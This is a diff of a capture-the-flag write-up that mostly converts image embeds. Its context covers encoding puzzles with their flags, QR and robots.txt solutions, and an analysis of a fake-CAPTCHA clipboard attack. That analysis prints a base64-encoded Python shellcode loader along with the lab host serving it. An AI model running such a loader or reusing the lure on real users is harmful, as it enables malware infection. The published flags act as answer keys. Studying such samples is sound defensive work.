@@ -1,6 +1,6 @@
 # Spam Test
 
-![[../assets/Pasted image 20251001191330.png]]
+![Pasted_image_20251001191330.png](../assets/Pasted_image_20251001191330.png)
 
 # Cover All Your Bases
 
@@ -24,7 +24,7 @@
 01100100 00111001 01100100 01100011 01111101
 ```
 
-![[../assets/Pasted image 20251001191515.png]]
+![Pasted_image_20251001191515.png](../assets/Pasted_image_20251001191515.png)
 
 ```
 116 151 143 145 154 171 040 144 157 156 145 041 040 124 150 141 164 040 167 141 163 040 102 141 163 
@@ -38,7 +38,7 @@
 143 071 175
 ```
 
-![[../assets/Pasted image 20251001191556.png]]
+![Pasted_image_20251001191556.png](../assets/Pasted_image_20251001191556.png)
 
 ```
 089 111 117 032 099 114 097 099 107 101 100 032 105 116 033 032 084 104 097 116 032 119 097 115 032 
@@ -51,7 +51,7 @@
 053 048 125
 ```
 
-![[../assets/Pasted image 20251001191629.png]]
+![Pasted_image_20251001191629.png](../assets/Pasted_image_20251001191629.png)
 
 ```
 41 77 65 73 6f 6d 65 20 6a 6f 62 21 20 54 68 61 74 20 77 61 73 20 42 61 73 65 20 31 36 2c 20 6f 72 
@@ -62,7 +62,7 @@
 32 62 65 33 65 34 65 34 61 38 66 35 31 37 64 39 63 35 63 65 34 33 37 32 62 30 62 37 7d
 ```
 
-![[../assets/Pasted image 20251001191716.png]]
+![Pasted_image_20251001191716.png](../assets/Pasted_image_20251001191716.png)
 
 ```
 I5XW6ZBAO5XXE2ZBEBKGQYLUEB3WC4ZAIJQXGZJAGMZCYIDPMZ2GK3RAOVZWKZBA
@@ -73,7 +73,7 @@ MF2CAZTMMFTSCIDGNRQWO6ZZMJRDKYTCHBSWCNJQHBRGGZTCMM2TCYTEGVSTCMLF
 MZRDEOLDMN6Q====
 ```
 
-![[../assets/Pasted image 20251001191943.png]]
+![Pasted_image_20251001191943.png](../assets/Pasted_image_20251001191943.png)
 
 ```
 K19X CSUEWQE24EBWE3/DK848UAIECV44HECN34HECDZC0R61Q57%E  CH44M-DSCAB44V3E6$CE4404
@@ -83,7 +83,7 @@ B44TVDCEC4WDI$5Y69O/E944E44PVDV1DE44PVDV3DVICYJCI-C4:6846:/6A46YICJOCGM64ECYJCKA
 7YJC2R6J-CZ2
 ```
 
-![[../assets/Pasted image 20251001192232.png]]
+![Pasted_image_20251001192232.png](../assets/Pasted_image_20251001192232.png)
 
 ```
 V2VsbCBkb25lISBUaGF0IHdhcyBCYXNlIDY0LCBzdXBlciBjb21tb24gZm9yIGVuY29kaW5nIGRh
@@ -92,7 +92,7 @@ ICsgYW5kIC8sIGFuZCBzb21ldGltZXMgdGhlIHBhZGRpbmcgPSBzaWducyBhdCB0aGUgZW5kLiBG
 bGFnOiBmbGFne2NkMDE2NGZmNjQ3MjZmMjk3MmIyZDhmMmFjMDExOWRifQ==
 ```
 
-![[../assets/Pasted image 20251001192322.png]]
+![Pasted_image_20251001192322.png](../assets/Pasted_image_20251001192322.png)
 
 ```
 <~:2+3L+EqaECEXg"BOQ!*G@>P86=FqH+?250+EqL5@qZupDf'',+DG^9A8,XfATD@"F<Ga8EbSs"FE9
@@ -103,7 +103,7 @@ _:@;KXg+EMgF@W-((/0K"XBlmiu+EV:.+@9LXAN2OiG%#E*@;^0>+@^0UB0%/ICggt'@5K\q@:_,Q2D[
 <IA2uM-1h/C&AN)S+@P_LS2.U<.I/~>
 ```
 
-![[../assets/Pasted image 20251001192412.png]]
+![Pasted_image_20251001192412.png](../assets/Pasted_image_20251001192412.png)
 
 ```
 @D_<sB5GVmj-;A[GD:PIptd9#KgRoG![3\gx4mcIUAiYA8M=E_=UOU5S$HqE$p<KHnvkV66}Q?tqB]P)
@@ -115,7 +115,7 @@ D:H4sK'c@^jAiC%1K}1^V65i/Upa*U(mEU'(Va'b/nt_*vgYH.^_V_Td5AgNoIWlD9jvOZ3oKhm/WwX+
 
 I stripped the newlines, other whitespaces, and decoded the string as `Base92` at <https://besku.com/base-decoder>
 
-![[../assets/Pasted image 20251001214146.png]]
+![Pasted_image_20251001214146.png](../assets/Pasted_image_20251001214146.png)
 
 ```
 𖡅驣ꍬ𐙥啴𒁪噢褠陨啴陷啳陂驳欠樵欳唬鵷顩啨陣啮陭啰𒁴𐘠陥ꍲ啹𔑥𓁥啹𐙕顩饯啥鵣𓁡顡驴捲縠啦𒁹啵驳啥鹷饬ꔠ𖡩𓅥𒀠啦饯啤ꍧ𒅹𓅨
@@ -124,7 +124,7 @@ I stripped the newlines, other whitespaces, and decoded the string as `Base92` a
 
 I used <https://www.better-converter.com/Encoders-Decoders/Base65536-Decode> to decode:
 
-![[../assets/Pasted image 20251002113207.png]]
+![Pasted_image_20251002113207.png](../assets/Pasted_image_20251002113207.png)
 
 # Just a Tiny Bit
 
@@ -171,15 +171,15 @@ if __name__ == "__main__":
         binary_file_to_text(data, sys.argv[2] if len(sys.argv) > 2 else None)
 ```
 
-![[../assets/Pasted image 20251001191213.png]]
+![Pasted_image_20251001191213.png](../assets/Pasted_image_20251001191213.png)
 
 # QRception
 
-![[../assets/Pasted image 20251001200643.png]]
+![Pasted_image_20251001200643.png](../assets/Pasted_image_20251001200643.png)
 
 After scanning:
 
-![[../assets/Pasted image 20251001200631.png]]
+![Pasted_image_20251001200631.png](../assets/Pasted_image_20251001200631.png)
 
 After scanning: `flag{e1487f138f885bfef64f07cdeac96908}`
 
@@ -187,13 +187,13 @@ After scanning: `flag{e1487f138f885bfef64f07cdeac96908}`
 
 Visiting `/robots.txt` revealed flag in the 1010 line of response:
 
-![[../assets/Pasted image 20251001212149.png]]
+![Pasted_image_20251001212149.png](../assets/Pasted_image_20251001212149.png)
 
 # Verify You Are Human
 
 Once we enter the website, we are presented with "Cloudflare" captcha, which after click presents the following:
 
-![[../assets/Pasted image 20251002113600.png]]
+![Pasted_image_20251002113600.png](../assets/Pasted_image_20251002113600.png)
 
 I am quite familiar with this type of attack, so it was known to me that malicious payload was stored in the user's clipboard:
 
@@ -219,13 +219,13 @@ Above payload downloads a disguised ZIP, extracts a Python payload to LocalAppDa
 
 http://10.1.252.145/?tic=2 hosts an downloadable archive file:
 
-![[../assets/Pasted image 20251002113830.png]]
+![Pasted_image_20251002113830.png](../assets/Pasted_image_20251002113830.png)
 
 After extraction, index directory is visible, and it's contents are:
 
-![[../assets/Pasted image 20251002114003.png]]
+![Pasted_image_20251002114003.png](../assets/Pasted_image_20251002114003.png)
 
-![[../assets/Pasted image 20251002115713.png]]
+![Pasted_image_20251002115713.png](../assets/Pasted_image_20251002115713.png)
 
 ```
 aW1wb3J0IGN0eXBlcwoKZGVmIHhvcl9kZWNyeXB0KGNpcGhlcnRleHRfYnl0ZXMsIGtleV9ieXRlcyk6CiAgICBkZWNyeXB0ZWRfYnl0ZXMgPSBieXRlYXJyYXkoKQogICAga2V5X2xlbmd0aCA9IGxlbihrZXlfYnl0ZXMpCiAgICBmb3IgaSwgYnl0ZSBpbiBlbnVtZXJhdGUoY2lwaGVydGV4dF9ieXRlcyk6CiAgICAgICAgZGVjcnlwdGVkX2J5dGUgPSBieXRlIF4ga2V5X2J5dGVzW2kgJSBrZXlfbGVuZ3RoXQogICAgICAgIGRlY3J5cHRlZF9ieXRlcy5hcHBlbmQoZGVjcnlwdGVkX2J5dGUpCiAgICByZXR1cm4gYnl0ZXMoZGVjcnlwdGVkX2J5dGVzKQoKc2hlbGxjb2RlID0gYnl0ZWFycmF5KHhvcl9kZWNyeXB0KGJhc2U2NC5iNjRkZWNvZGUoJ3pHZGdUNkdIUjl1WEo2ODJrZGFtMUE1VGJ2SlAvQXA4N1Y2SnhJQ3pDOXlnZlgyU1VvSUwvVzVjRVAveGVrSlRqRytaR2dIZVZDM2NsZ3o5eDVYNW1nV0xHTmtnYStpaXhCeVRCa2thMHhicVlzMVRmT1Z6azJidURDakFlc2Rpc1U4ODdwOVVSa09MMHJEdmU2cWU3Z2p5YWI0SDI1ZFBqTytkVllrTnVHOHdXUT09JyksIGJhc2U2NC5iNjRkZWNvZGUoJ21lNkZ6azBIUjl1WFR6enVGVkxPUk0yVitacU1iQT09JykpKQpwdHIgPSBjdHlwZXMud2luZGxsLmtlcm5lbDMyLlZpcnR1YWxBbGxvYyhjdHlwZXMuY19pbnQoMCksIGN0eXBlcy5jX2ludChsZW4oc2hlbGxjb2RlKSksIGN0eXBlcy5jX2ludCgweDMwMDApLCBjdHlwZXMuY19pbnQoMHg0MCkpCmJ1ZiA9IChjdHlwZXMuY19jaGFyICogbGVuKHNoZWxsY29kZSkpLmZyb21fYnVmZmVyKHNoZWxsY29kZSkKY3R5cGVzLndpbmRsbC5rZXJuZWwzMi5SdGxNb3ZlTWVtb3J5KGN0eXBlcy5jX2ludChwdHIpLCBidWYsIGN0eXBlcy5jX2ludChsZW4oc2hlbGxjb2RlKSkpCmZ1bmN0eXBlID0gY3R5cGVzLkNGVU5DVFlQRShjdHlwZXMuY192b2lkX3ApCmZuID0gZnVuY3R5cGUocHRyKQpmbigpz
@@ -233,7 +233,7 @@ aW1wb3J0IGN0eXBlcwoKZGVmIHhvcl9kZWNyeXB0KGNpcGhlcnRleHRfYnl0ZXMsIGtleV9ieXRlcyk6
 
 Selected section looks like base64:
 
-![[../assets/Pasted image 20251002115755.png]]
+![Pasted_image_20251002115755.png](../assets/Pasted_image_20251002115755.png)
 
 ```python
 import ctypes
@@ -283,11 +283,11 @@ if __name__ == "__main__":
 
 ```
 
-![[../assets/Pasted image 20251002133817.png]]
+![Pasted_image_20251002133817.png](../assets/Pasted_image_20251002133817.png)
 
 I renamed shellcode.bin to shellcode.sc and run scdbgc:
 
-![[../assets/Pasted image 20251002124144.png]]
+![Pasted_image_20251002124144.png](../assets/Pasted_image_20251002124144.png)
 
 As it can be seen from the assembly above, dword values are pushed onto the stack and later each of the bits is XOR'red with 0xa5
 
@@ -314,4 +314,4 @@ if __name__ == "__main__":
     print(decoded.decode())
 ```
 
-![[../assets/Pasted image 20251002131150.png]]
+![Pasted_image_20251002131150.png](../assets/Pasted_image_20251002131150.png)
